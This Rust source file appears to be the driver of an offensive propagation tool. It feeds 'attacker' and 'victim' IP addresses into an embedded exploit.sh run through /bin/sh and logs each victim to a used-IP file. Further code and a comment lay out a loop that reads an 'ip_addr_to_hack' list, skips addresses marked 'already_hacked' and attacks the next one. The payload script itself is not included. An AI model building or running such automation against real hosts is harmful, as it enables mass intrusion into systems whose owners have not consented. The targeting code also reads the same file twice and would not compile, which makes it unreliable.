use std::process::Command;
use std::thread;
use std::time::Duration;
use std::fs::{OpenOptions, File};
use std::io::{Write,BufReader,BufRead};
use std::net::{IpAddr, Ipv4Addr};

pub fn execute_shell_script(attacker: &str, victim: &str) {

    thread::sleep(Duration::from_secs(2));

    let output = Command::new("/bin/sh")
        .arg("-c")
        .arg(format!("attacker=\"{}\" victim=\"{}\" {}", attacker, victim, include_str!("../www/exploit.sh")))
        .output()
        .expect("failed to execute .sh");

    println!("Script output: {:?}", String::from_utf8_lossy(&output.stdout));

    let file_result = OpenOptions::new().create(true).append(true).open("www/used_ip");

    match file_result {
        Ok(mut file) => match file.write_all(victim.as_bytes()) {
                Ok(_) => println!("Ok: {}: Writing finished.", victim),
                Err(..) => println!("Fail: {}: Err the file can't be writen.", victim),
        },
        Err(..) => println!("Warning: {}: No file received.", victim)
    };
    //file.write_all(victim.as_bytes());

}


#[allow(dead_code)]
fn make_ip_addr(ip_addr: &str) -> IpAddr{

        let ip_vector: Vec<&str> = ip_addr.split('.').collect();


        let ip_addr_1: u8 = ip_vector[0].parse().expect("Please use a valid u8");
        let ip_addr_2: u8 = ip_vector[1].parse().expect("Please use a valid u8");
        let ip_addr_3: u8 = ip_vector[2].parse().expect("Please use a valid u8");
        let ip_addr_4: u8 = ip_vector[3].parse().expect("Please use a valid u8");


        let ip_addr = IpAddr::V4(Ipv4Addr::new(ip_addr_1,ip_addr_2, ip_addr_3, ip_addr_4));
        
        ip_addr
}

#[allow(dead_code)]
pub fn ip_targeting(path: &str) -> Result<Vec<IpAddr>,std::io::Error>{

    let mut victims_ip: Vec<IpAddr> = vec![];
    let mut used_ip: Vec<IpAddr> = vec![];



    let used_ip_file = File::open(path)?;
    let used_ip_reader = BufReader::new(used_ip_file);

    let victim_ip_file = File::open(path)?;
    let victim_ip_reader = BufReader::new(victim_ip_file);

    for line in used_ip_reader.lines(){
        let line = make_ip_addr(&line.unwrap());
        used_ip.push(line);
    }

    for line in victim_ip_reader.lines(){

        let line = make_ip_addr(&line.unwrap());
        victims_ip.push(line);

        for used_ip_addr in used_ip {
            if line == used_ip_addr {
                victims_ip.pop();
            }    
        }
    }

    Ok(victims_ip)

}

/*
conf/ip_addr_to_hack => static
read first line


open conf/already_hacked => added address

check if first_line in conf/already_hacked

if  no {
    hack ip_first_line()
}
write all the rest of ip_addr_to_hack in rest_to_hack

www/rest_to_hack => write all

*/

